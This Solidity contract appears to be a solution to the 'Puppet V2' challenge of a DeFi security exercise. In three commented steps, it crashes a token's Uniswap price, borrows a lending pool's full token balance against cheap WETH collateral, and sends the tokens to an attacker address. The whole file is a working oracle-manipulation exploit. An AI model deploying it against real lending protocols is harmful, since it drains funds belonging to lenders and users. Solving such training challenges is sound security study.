// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to) external returns (uint amount0In, uint amount1In);
}
interface IUniswapRouter {
    function swapExactTokensForTokens(
    uint amountIn,
    uint amountOutMin,
    address[] calldata path,
    address to,
    uint deadline
    ) external returns (uint[] memory amounts);    
}
interface IPuppetV2Pool {
    function borrow(uint256 borrowAmount) external;
}

interface IWETH9 is IERC20 {
    function deposit() external payable;
    function withdraw(uint wad) external;
}

contract PuppetV2PoolAttack {

    function run(
                address _attackAddress,
                address _wethAddress,
                address _tokenAddress,
                address _routerAddress,
                address _lendingPoolAddress
                ) 
                external payable
    {
        IPuppetV2Pool lendingPool = IPuppetV2Pool(_lendingPoolAddress);
        IERC20 token = IERC20(_tokenAddress);
        IWETH9 wethToken = IWETH9(_wethAddress);
        wethToken.deposit{value:address(this).balance}();
        
        //1.先把所有TOKEN换成WETH （价格下降）
        IUniswapRouter router = IUniswapRouter(_routerAddress);
        token.approve(_routerAddress, token.balanceOf(address(this)));
        address[] memory paths = new address[](2);
        paths[0]=_tokenAddress;
        paths[1]=_wethAddress;
        router.swapExactTokensForTokens(
            token.balanceOf(address(this)),
            1,
            paths,
            address(this),
            block.timestamp + 1 days);

        //2.再借出来TOKEN
        wethToken.approve(_lendingPoolAddress,wethToken.balanceOf(address(this)));
        lendingPool.borrow(token.balanceOf(_lendingPoolAddress));

        //3.再转给attack
        token.transfer(_attackAddress,token.balanceOf(address(this)));
    }

    receive() external payable{}
}
 